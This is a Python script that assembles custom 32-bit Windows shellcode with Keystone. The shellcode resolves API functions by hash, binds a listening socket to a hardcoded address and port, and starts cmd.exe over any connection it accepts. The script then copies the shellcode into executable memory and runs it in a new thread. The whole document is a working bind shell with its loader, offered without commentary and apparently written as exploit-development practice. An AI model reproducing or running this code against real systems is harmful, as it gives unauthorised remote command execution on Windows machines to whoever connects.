from keystone import *
import ctypes,struct

CODE = (
"start:                      "
"    mov ebp,esp            ;"
"    add esp,0xfffff9f0     ;"
"    xor ecx,ecx            ;"
"    mov esi,fs:[ecx+0x30]  ;"
"    mov esi,[esi+0xc]      ;"
"    mov esi,[esi+0x1c]     ;"
"next_module:                "
"    mov ebx,[esi+8]        ;"
"    mov edi,[esi+0x20]     ;"
"    mov esi,[esi]          ;"
"    cmp [edi+12*2],ecx     ;"
"    jne next_module        ;"
"find_function_shorten:     "
"    jmp find_function_shorten_bnc;"
"find_function_ret:          "
"    pop esi                ;"
"    mov [ebp+0x4],esi      ;"
"    jmp resolve_symbols_kernel32;"
"find_function_shorten_bnc:  "
"    call find_function_ret ;"
"find_function:              "
"    pushad                 ;"
"    mov eax,[ebx+0x3c]     ;"
"    mov edi,[ebx+eax+0x78] ;"
"    add edi,ebx            ;"
"    mov ecx,[edi+0x18]     ;"
"    mov eax,[edi+0x20]     ;"
"    add eax,ebx            ;"
"    mov [ebp-4],eax        ;"
"find_function_loop:        "
"    jecxz find_function_finished;"
"    dec ecx                ;"
"    mov eax,[ebp-4]        ;"
"    mov esi,[eax+ecx*4]    ;"
"    add esi,ebx            ;"
"compute_hash:              "
"    xor eax,eax            ;"
"    cdq                    ;"
"    cld                    ;"
"compute_hash_again:        "
"    lodsb                  ;"
"    test al,al             ;"
"    jz compute_hash_finished;"
"    ror edx,0x0d           ;"
"    add edx,eax            ;"
"    jmp compute_hash_again ;"
"compute_hash_finished:     "
"find_function_compare:     "
"    cmp edx,[esp+0x24]     ;"
"    jnz find_function_loop ;"
"    mov edx,[edi+0x24]     ;"
"    add edx,ebx            ;"
"    mov cx,[edx+2*ecx]     ;"
"    mov edx,[edi+0x1c]     ;"
"    add edx,ebx            ;"
"    mov eax,[edx+4*ecx]    ;"
"    add eax,ebx            ;"
"    mov [esp+0x1c],eax     ;"
"find_function_finished:    "
"    popad                  ;"
"    ret                    ;"
"resolve_symbols_kernel32:   "
"    push 0xec0e4e8e         ;"     #LoadLibraryA
"    call dword ptr [ebp+0x04];"
"    mov [ebp+0x14],eax      ;"
"    push 0x78b5b983        ;"      # TerminateProcess
"    call dword ptr [ebp+0x04];"
"    mov [ebp+0x10],eax     ;"
"    push 0x16b3fe72         ;"     # CreateProcessA
"    call dword ptr [ebp+0x04];"
"    mov [ebp+0x18],eax     ;"
"load_ws2_32:               "
"    xor eax,eax            ;"
"    mov ax,0x6c6c          ;"
"    push eax               ;"
"    push 0x642e3233        ;"
"    push 0x5f327377        ;"
"    push esp               ;"
"    call dword ptr [ebp+0x14];"
"resolve_symbols_ws2_32:    "
"    mov ebx,eax            ;"
"    push 0x3bfcedcb        ;"      # WSAStartup
"    call dword ptr [ebp+0x04];"
"    mov [ebp+0x1c],eax     ;"
"    push 0xadf509d9        ;"      # WSASocketA
"    call dword ptr [ebp+0x04];"
"    mov [ebp+0x20],eax     ;"
"    push 0xc7701aa4        ;"      # bind
"    call dword ptr [ebp+0x04];"
"    mov [ebp+0x24],eax     ;"
"    push 0xe92eada4        ;"      # listen
"    call dword ptr [ebp+0x04];"
"    mov [ebp+0x28],eax     ;"
"    push 0x498649e5        ;"      # accept
"    call dword ptr [ebp+0x04];"
"    mov [ebp+0x2c],eax     ;"
"call_wsastartup:           "
"    mov eax,esp            ;"
"    mov cx,0x509           ;"
"    sub eax,ecx            ;"
"    push eax               ;"
"    xor eax,eax            ;"
"    mov ax,0x0202          ;"
"    push eax               ;"
"    call dword ptr [ebp+0x1c];"
"call_wsasocket:            "
"    xor eax,eax            ;"
"    push eax               ;"
"    push eax               ;"
"    push eax               ;"
"    mov al,0x6             ;"
"    push eax               ;"
"    mov al,0x01            ;"
"    push eax               ;"
"    inc eax                ;"
"    push eax               ;"
"    call dword ptr [ebp+0x20];"
"bind:                      "
"    mov esi,eax            ;"
"    xor eax,eax            ;"
"    push eax               ;"
"    push eax               ;"
"    push 0x0a92a8c0        ;"
"	 mov ax,0xb315						 ;"
"	 shl eax,0x10							;"
"	 add eax,0x02							;"
"	 push eax									;"
"    push esp               ;"
"    pop edi								 ;"
"    xor eax,eax            ;"
"    mov al,0x10            ;"
"    push eax               ;"
"    push edi               ;"
"    push esi               ;"
"    call dword ptr [ebp+0x24];"
"listen:                    "
"    push eax               ;"
"    push esi               ;"
"    call dword ptr [ebp+0x28];"
"accept:                    "
"    int3                   ;"
"    xor eax,eax            ;"
"    push eax               ;"
"    push eax               ;"
"    push esi               ;"
"    call dword ptr [ebp+0x2c];"
"mov esi,eax                ;"
"cmd_exe:					"
"	 int3										 ;"
"	 xor eax,eax            ;"
"	 push eax               ;"
"	 push 0x6578652E				 ;"
"	 push 0x646d6300				 ;"
"	 push esp               ;"
"	 pop ebx								 ;"
"	 inc ebx								 ;"
"startup_info:				"
"	 push esi 	            ;"
"	 push esi               ;"
"	 push esi								 ;"
"	 xor eax,eax            ;"
"	 push eax               ;"
"	 push eax								 ;"
"	 mov al,0x80						 ;"
"	 xor ecx,ecx            ;"
"	 mov cl,0x80						 ;"
"	 add eax,ecx            ;"
"	 push eax               ;"
"	 xor eax,eax						 ;"
"	 push eax               ;"
"	 push eax               ;"
"	 push eax								 ;"
"	 push eax               ;"
"	 push eax               ;"
"	 push eax               ;"
"	 push eax               ;"
"	 push eax               ;"
"	 push eax               ;"
"	 push eax               ;"
"	 mov al,0x44			;"
"	 push eax               ;"
"	 push esp				;"
"	 pop edi				;"
"create_process:			"
"	 mov eax,esp            ;"
"	 xor ecx,ecx            ;"
"	 mov cx,0x190			;"
"	 sub eax,ecx            ;"
"	 push eax				;"					#lpProcessInformation
"	 push edi 				;"
"	 xor eax,eax            ;"
"	 push eax               ;"
"	 push eax               ;"
"	 push eax				;"
"	 inc eax 				;"
"	 push eax 				;"
"	 dec eax				;"
"	 push eax               ;"
"	 push eax               ;"
"	 push ebx	            ;"
"	 push eax				;"
"	 call dword ptr [ebp+0x18];"
"exec_shellcode:            "
"    xor ecx,ecx            ;"
"    push ecx               ;"
"    push 0xffffffff        ;"
"    call dword ptr [ebp+0x10];"
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding,count = ks.asm(CODE)

sh = b""
for e in encoding:
	sh += struct.pack("B", e)

shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
